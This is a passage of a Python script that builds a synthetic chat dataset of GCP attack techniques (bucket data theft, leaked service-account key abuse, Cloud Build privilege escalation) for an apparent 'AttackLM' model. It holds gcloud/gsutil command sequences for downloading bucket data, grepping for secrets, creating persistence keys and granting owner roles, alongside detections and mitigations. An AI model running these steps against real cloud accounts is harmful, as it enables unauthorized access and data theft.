            "Require approval for project owner/editor assignments",
            "Service account impersonation restrictions",
            "Cloud Audit Logs monitoring for IAM changes",
        ],
    },
    {
        "category": "gcp_security",
        "name": "GCP Storage Bucket Misconfiguration",
        "mitre_ids": ["T1530"],
        "desc": "Exploiting misconfigured GCP Storage buckets to exfiltrate data.",
        "steps": "1. Enumerate buckets: `gsutil ls` or `gsutil ls gs://<project-id>/`\n2. Check bucket IAM: `gsutil iam get gs://<bucket>`\n3. Check for public access: `gsutil stat gs://<bucket>/` with anonymous credentials\n4. List objects: `gsutil ls gs://<bucket>/`\n5. Download sensitive data: `gsutil -m cp -r gs://<bucket> /tmp/gcs-data`\n6. Check for credentials in objects: `grep -r 'password\\|secret\\|api_key' /tmp/gcs-data/`",
        "detection": [
            "Public bucket access in Cloud Audit Logs",
            "Large data downloads from GCS",
            "allUsers or allAuthenticatedUsers in bucket IAM",
            "Bucket enumeration from external IPs",
        ],
        "mitigations": [
            "Remove allUsers and allAuthenticatedUsers from bucket IAM",
            "Uniform bucket-level access",
            "VPC Service Controls for storage buckets",
            "Cloud DLP for sensitive data in buckets",
        ],
    },
    {
        "category": "gcp_security",
        "name": "GCP Service Account Key Exposure",
        "mitre_ids": ["T1552.001"],
        "desc": "Finding and exploiting exposed GCP service account keys for unauthorized access.",
        "steps": "1. Search for exposed keys: GitHub, GitLab, public repos, S3/GCS buckets\n2. Validate key: `gcloud auth activate-service-account --key-file=<sa-key.json>`\n3. Identify project and permissions: `gcloud config get-value project` and `gcloud iam service-accounts get-iam-policy <sa>`\n4. Enumerate resources: `gcloud compute instances list`, `gcloud sql instances list`, `gcloud storage ls`\n5. Create new key for persistence: `gcloud iam service-accounts keys create --iam-account=<sa> new-key.json`\n6. Escalate via IAM: `gcloud projects add-iam-policy-binding <project> --member serviceAccount:<sa> --role roles/owner`",
        "detection": [
            "Service account key creation events",
            "Key usage from unusual IP addresses",
            "Service account authentication from unexpected regions",
            "Multiple keys for same service account",
        ],
        "mitigations": [
            "Use Workload Identity instead of service account keys",
            "Short-lived tokens via IAM Credentials API",
            "DLP scanning for exposed keys in public repos",
            "Organization Policy limiting service account key creation",
        ],
    },
    {
        "category": "gcp_security",
        "name": "GCP Cloud Build Privilege Escalation",
        "mitre_ids": ["T1548.001"],
        "desc": "Exploiting GCP Cloud Build service agent permissions for privilege escalation.",
        "steps": "1. Identify Cloud Build service account: `<project-number>@cloudbuild.gserviceaccount.com`\n2. Check permissions: `gcloud projects get-iam-policy <project> | grep cloudbuild`\n3. Cloud Build SA typically has roles/cloudbuild.builds.editor and roles/storage.admin\n4. Submit build with malicious steps: `gcloud builds submit --config=cloudbuild.yaml`\n5. cloudbuild.yaml contents: execute commands as Cloud Build SA\n6. Exfiltrate data or create new SA key: `gcloud iam service-accounts keys create key.json --iam-account=<sa>`",
        "detection": [
            "Cloud Build submissions from unexpected sources",
            "Cloud Build SA used outside build context",
            "IAM role grants to Cloud Build service account",
            "Build steps containing suspicious commands",
        ],
        "mitigations": [
            "Restrict Cloud Build service account permissions",
            "Use Cloud Build private pools",
            "VPC Service Controls around build infrastructure",
            "Cloud Audit Logs monitoring for build abuse",
        ],
    },
]

# ---------------------------------------------------------------------------
# Question Templates
# ---------------------------------------------------------------------------
QUESTION_TEMPLATES = [
    "Explain {name} with a detailed step-by-step attack walkthrough.",
    "How does {name} work? Show me the exact commands and detection methods.",
    "For a cloud security assessment, detail the {name} attack technique.",
    "Walk me through {name} exploitation. What are the key indicators and mitigations?",
    "Demonstrate {name} with specific cloud CLI commands. Include detection and remediation.",
    "What is {name}? Provide exploitation steps, real command syntax, and defense strategies.",
    "Describe {name} from the attacker's perspective. Include CLI commands and cloud-specific techniques.",
    "In a {environment_type}, how would you test for {name}? Provide complete methodology per {framework}.",
    "Detail the {severity_level}-severity {name} vulnerability assessment for a {environment_type}. Reference {framework}.",
    "For {framework} compliance, describe the detection and mitigation of {name} in a {environment_type}.",
    "How would a Red Team validate {name} in a {environment_type}? Include detection engineering and {framework} references.",
    "What are the indicators of compromise for {name} in a {environment_type}? Map to {framework}.",
    "Describe a complete {severity_level}-severity security test for {name} following {framework} methodology in a {environment_type}.",
    "What defensive strategies from {framework} address {name} in a {environment_type}?",
    "How does {name} relate to MITRE ATT&CK technique {mitre_ids}? Show detection engineering for {environment_type}.",
    "Provide a {severity_level}-severity vulnerability assessment walkthrough for {name} using {framework} in a {environment_type}.",
    "What are the prerequisites and attack surface for {name} in a {environment_type}? Reference {framework}.",
    "Detail the full lifecycle of {name}: discovery, exploitation, detection, and remediation for {environment_type} per {framework}.",
    "For an authorized penetration test, outline the {name} attack chain in a {environment_type} aligned with {framework}.",
    "Map {name} to {framework}. What detection rules and mitigation controls are needed for a {environment_type}?",
    "In the context of {framework}, what security testing methodology applies to {name} at {severity_level} severity in a {environment_type}?",
    "Explain {category} attack {name} with step-by-step commands, detection logic, and {framework}-aligned mitigations for {environment_type}.",
]


def generate_pairs(count: int = 5) -> list[dict]:
    random.seed(SEED)
    pairs: list[dict] = []

    for attack in CLOUD_ATTACKS:
        category = attack["category"]
        name = attack["name"]
        mitre_ids = attack["mitre_ids"]

        base_variants = max(2, min(count, len(QUESTION_TEMPLATES)))

        if count <= 3:
            chosen_templates = random.sample(QUESTION_TEMPLATES[:7], base_variants)
        else:
            chosen_templates = random.sample(
                QUESTION_TEMPLATES,
                min(base_variants + count - 3, len(QUESTION_TEMPLATES)),
            )

        environments = random.sample(
            ENVIRONMENT_TYPES, min(3 + count, len(ENVIRONMENT_TYPES))
        )
        severities = random.sample(
            SEVERITY_LEVELS, min(2 + count // 2, len(SEVERITY_LEVELS))
        )
        frameworks = random.sample(
            TESTING_FRAMEWORKS, min(2 + count // 2, len(TESTING_FRAMEWORKS))
        )

        for idx, q_template in enumerate(chosen_templates):
            env = environments[idx % len(environments)]
            sev = severities[idx % len(severities)]
            fw = frameworks[idx % len(frameworks)]

            user = q_template.format(
                name=name,
                category=category.replace("_", " ").title(),
                severity_level=sev,
                environment_type=env,
                framework=fw,
                mitre_ids=", ".join(mitre_ids),
            )

            assistant = f"**{name}** (MITRE: {', '.join(mitre_ids)})\n\n"
            assistant += f"**Category:** {category.replace('_', ' ').title()}\n\n"
            assistant += f"**Severity:** {sev.title()}\n\n"
            assistant += f"**Environment:** {env.title()}\n\n"
            assistant += f"**Testing Framework:** {fw}\n\n"
            assistant += f"**Description:** {attack['desc']}\n\n"
            assistant += f"**Attack Steps:**\n{attack['steps']}\n\n"

            if attack.get("detection"):
                det = "\n".join(f"- {d}" for d in attack["detection"])
                assistant += f"**Detection:**\n{det}\n\n"

            if attack.get("mitigations"):
                mit = "\n".join(f"- {m}" for m in attack["mitigations"])
                assistant += f"**Mitigations:**\n{mit}\n"

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": SOURCE_NAME,
                    "license": LICENSE,
                }
            )

    random.shuffle(pairs)
    return pairs


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(
        description="Acquire Cloud Attack dataset for AttackLM"
    )
    parser.add_argument("--output", default=None, help="Custom output directory")
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of variant multiplier per attack entry (default: 5)",
    )
    args = parser.parse_args()

    output_dir = Path(args.output) if args.output else BUCKET_DIR
    data_file = output_dir / "data_synth.jsonl"
    meta_file = output_dir / "metadata.json"

    pairs = generate_pairs(count=args.count)

    output_dir.mkdir(parents=True, exist_ok=True)
    with open(data_file, "w", encoding="utf-8") as f:
        for pair in pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    from collections import Counter

    cat_counts = Counter()
    all_categories = sorted(set(a["category"] for a in CLOUD_ATTACKS))
    for p in pairs:
        for msg in p["messages"]:
            if msg["role"] == "assistant" and "**Category:**" in msg["content"]:
                for cat in all_categories:
                    if cat.replace("_", " ").title() in msg["content"]:
                        cat_counts[cat] += 1
                        break

    mitre_ids_all: list[str] = []
    for p in pairs:
        mitre_ids_all.extend(p.get("mitre_ids", []))
    unique_mitre = sorted(set(mitre_ids_all))

    metadata = {
        "name": "attacks",
        "display_name": "Cloud Security Attacks",
        "category": "cloud",
        "mitre_tactic": "TA0008",
        "description": (
            f"Cloud security attack dataset covering {len(cat_counts)} categories: "
            "AWS IAM, S3, container escapes, Kubernetes, serverless, IMDS, Azure AD, "
            "and GCP security exploitation. Aligned with MITRE ATT&CK Cloud Matrix."
        ),
        "source_file": data_file.name,
        "created": datetime.now(timezone.utc).isoformat(),
        "count": len(pairs),
        "sub_sources": {"human": 0, "llm": 0, "synth": len(pairs)},
        "mitre_ids": unique_mitre,
    }

    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    print(f"\nCloud Attack dataset generated:")
    print(f"  Pairs: {len(pairs)}")
    print(f"  Attack entries: {len(CLOUD_ATTACKS)}")
    print(f"  Categories: {dict(cat_counts)}")
    print(f"  MITRE IDs: {unique_mitre}")
    print(f"  Output: {data_file}")
    print(f"  Metadata: {meta_file}")


if __name__ == "__main__":
    main()
